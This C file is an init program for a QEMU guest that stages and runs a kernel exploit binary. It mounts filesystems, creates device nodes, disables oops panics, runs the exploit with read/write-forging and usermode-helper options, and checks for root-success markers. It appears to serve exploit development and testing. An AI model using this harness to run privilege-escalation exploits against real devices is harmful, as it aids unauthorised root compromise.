/* init_e2e.c — QEMU guest init: mount, stage, run the exploit, report,
 * power off. Static NDK build; no libc dependencies beyond bionic-static.
 *
 * The exploit binary is baked into the initramfs at /boot/g4; this init
 * copies it to /data/local/tmp/a/g4 (the exploit expects to write there)
 * and runs: GL_WQ_UMH=1 RWF_DEBUG=1 /data/local/tmp/a/g4 --rwforge
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/reboot.h>
#include <sys/wait.h>
#include <sys/sysinfo.h>
#include <sys/resource.h>
#include <sys/sysmacros.h>
#include <stdarg.h>

static void logline(const char *fmt, ...) {
  va_list ap;
  va_start(ap, fmt);
  vprintf(fmt, ap);
  va_end(ap);
  fflush(stdout);
  fsync(1);
}

static int copy_file(const char *src, const char *dst, int mode) {
  int s = open(src, O_RDONLY);
  if (s < 0) return -1;
  int d = open(dst, O_WRONLY | O_CREAT | O_TRUNC, mode);
  if (d < 0) { close(s); return -1; }
  char buf[4096];
  ssize_t n;
  while ((n = read(s, buf, sizeof(buf))) > 0)
    if (write(d, buf, n) != n) break;
  close(s);
  close(d);
  return 0;
}

static void cat_file(const char *path) {
  int fd = open(path, O_RDONLY);
  if (fd < 0) { logline("[init] %s: %s\n", path, strerror(errno)); return; }
  char buf[1024];
  ssize_t n;
  while ((n = read(fd, buf, sizeof(buf))) > 0) {
    fwrite(buf, 1, n, stdout);
  }
  close(fd);
  fflush(stdout);
  fsync(1);
}

int main(void) {
  setvbuf(stdout, NULL, _IONBF, 0);
  logline("[init] e2e guest boot\n");
  if (mount("devtmpfs", "/dev", "devtmpfs", 0, NULL) != 0)
    logline("[init] devtmpfs mount failed (%s) — mknod fallback\n", strerror(errno));
  mkdir("/proc", 0755);
  mount("proc", "/proc", "proc", 0, NULL);
  mkdir("/sys", 0755);
  mount("sysfs", "/sys", "sysfs", 0, NULL);
  mkdir("/data", 0755);
  mount("tmpfs", "/data", "tmpfs", 0, NULL);
  mkdir("/data/local", 0755);
  mkdir("/data/local/tmp", 0755);
  mkdir("/data/local/tmp/a", 0755);

  /* keep the kernel alive across a faulting exploit thread (debuggability) */
  {
    int pfd = open("/proc/sys/kernel/panic_on_oops", O_WRONLY);
    if (pfd >= 0) { write(pfd, "0", 1); close(pfd); }
    pfd = open("/proc/sys/kernel/panic_on_warn", O_WRONLY);
    if (pfd >= 0) { write(pfd, "0", 1); close(pfd); }
  }

  /* device nodes the exploit needs (no devtmpfs in this kernel config) */
  mknod("/dev/null", S_IFCHR | 0666, makedev(1, 3));
  mknod("/dev/zero", S_IFCHR | 0666, makedev(1, 5));
  mknod("/dev/ptmx", S_IFCHR | 0666, makedev(5, 2));
  mkdir("/dev/pts", 0755);
  if (mount("devpts", "/dev/pts", "devpts", 0, NULL) != 0)
    logline("[init] devpts mount failed: %s\n", strerror(errno));
  {
    /* ashmem is a miscdevice with a dynamic minor — resolve via /proc/misc */
    FILE *f = fopen("/proc/misc", "r");
    int minor = -1, m;
    char name[64];
    if (f) {
      while (fscanf(f, "%d %63s", &m, name) == 2)
        if (strcmp(name, "ashmem") == 0) { minor = m; break; }
      fclose(f);
    }
    if (minor >= 0) {
      mknod("/dev/ashmem", S_IFCHR | 0666, makedev(10, minor));
      logline("[init] /dev/ashmem -> 10:%d\n", minor);
    } else {
      logline("[init] WARN: no ashmem in /proc/misc\n");
    }
  }

  /* exploit pins fds up to ~8200; default guest rlimit is 1024 */
  {
    struct rlimit rl = { 32768, 32768 };
    if (setrlimit(RLIMIT_NOFILE, &rl) != 0)
      logline("[init] WARN: setrlimit NOFILE failed: %s\n", strerror(errno));
  }

  cat_file("/proc/version");
  cat_file("/proc/sys/kernel/random/boot_id");

  if (copy_file("/boot/g4", "/data/local/tmp/a/g4", 0755) != 0)
    logline("[init] FATAL: /boot/g4 missing: %s\n", strerror(errno));
  /* the exploit writes umh.sh itself; nothing else to stage */

  logline("[init] uname: ");
  {
    struct sysinfo si;
    sysinfo(&si);
    logline("uptime=%ld loads=%ld\n", si.uptime, si.loads[0]);
  }
  cat_file("/proc/sys/kernel/ostype");
  {
    /* uname -r without a shell */
    int fd = open("/proc/sys/kernel/osrelease", O_RDONLY);
    if (fd >= 0) {
      char b[128] = {0};
      ssize_t n = read(fd, b, 127);
      (void)n;
      logline("[init] osrelease=%s", b);
      close(fd);
    }
  }

  /* phase 1 (opt-in): raw-primitive land-rate diagnostic — N constrained
   * writes at the boot_id uuid storage, watching /proc/.../boot_id change.
   * Skipped unless /boot/diag exists in the initramfs; if /boot/diag contains
   * digits, they set PSELECT_ROUTE_DELAY_USEC for the sweep. */
  if (access("/boot/diag", F_OK) == 0) {
    char delayenv[64] = "PSELECT_ROUTE_DELAY_USEC=";
    {
      int dfd = open("/boot/diag", O_RDONLY);
      char db[32] = {0};
      ssize_t dn = dfd >= 0 ? read(dfd, db, 31) : 0;
      if (dfd >= 0) close(dfd);
      int di = (int)strlen(delayenv);
      for (ssize_t i = 0; i < dn && di < 62; i++)
        if (db[i] >= '0' && db[i] <= '9') delayenv[di++] = db[i];
      delayenv[di] = 0;
      if (di == (int)strlen("PSELECT_ROUTE_DELAY_USEC=")) delayenv[0] = 0;
    }
    logline("[init] DIAG phase: W2_BOOTID_TEST=8 %s g4\n",
            delayenv[0] ? delayenv : "(default delay)");
    char *const dargv[] = { "/data/local/tmp/a/g4", NULL };
    char *const denvp[] = {
      "W2_BOOTID_TEST=8", "RWF_DEBUG=1", "NO_SLIDE_LEAK=1",
      "KPHYS=0x40200000",
      delayenv[0] ? delayenv : (char *)"PATH=/bin",
      delayenv[0] ? (char *)"PATH=/bin" : NULL,
      NULL
    };
    pid_t dpid = fork();
    if (dpid == 0) {
      execve(dargv[0], dargv, denvp);
      _exit(127);
    }
    int dst = 0;
    waitpid(dpid, &dst, 0);
    logline("[init] DIAG exited status=0x%x\n", dst);
    /* dump the tail of the function trace (bounded) */
    int tfd = open("/sys/kernel/tracing/trace", O_RDONLY);
    if (tfd >= 0) {
      off_t sz = lseek(tfd, 0, SEEK_END);
      lseek(tfd, sz > 400000 ? sz - 400000 : 0, SEEK_SET);
      char buf[4096];
      ssize_t n;
      logline("[init] ---- ftrace tail ----\n");
      while ((n = read(tfd, buf, sizeof(buf))) > 0)
        fwrite(buf, 1, n, stdout);
      close(tfd);
      logline("\n[init] ---- ftrace end ----\n");
      fflush(stdout); fsync(1);
    }
  }

  logline("[init] running: GL_WQ_UMH=1 RWF_DEBUG=1 /data/local/tmp/a/g4 --rwforge\n");
  char *const argv[] = { "/data/local/tmp/a/g4", "--rwforge", NULL };
  char *const envp[] = {
    "GL_WQ_UMH=1", "RWF_DEBUG=1", "KPHYS=0x40200000",
    "GL_RWF_SLOTS=128", "PSELECT_ROUTE_DELAY_USEC=100000", "PATH=/bin", NULL
  };
  pid_t pid = fork();
  if (pid == 0) {
    execve(argv[0], argv, envp);
    logline("[init] execve failed: %s\n", strerror(errno));
    _exit(127);
  }
  int st = 0;
  waitpid(pid, &st, 0);
  logline("[init] exploit exited status=0x%x (exit=%d sig=%d)\n",
          st, WIFEXITED(st) ? WEXITSTATUS(st) : -1,
          WIFSIGNALED(st) ? WTERMSIG(st) : -1);

  logline("[init] marker check:\n");
  cat_file("/data/local/tmp/a/.umh_rooted");
  cat_file("/data/local/tmp/cap/id.txt");
  cat_file("/data/local/tmp/cap/fake_sh_ran.txt");
  cat_file("/proc/sys/kernel/random/boot_id");
  logline("[init] E2E-DONE\n");
  sync();
  reboot(RB_POWER_OFF);
  return 0;
}
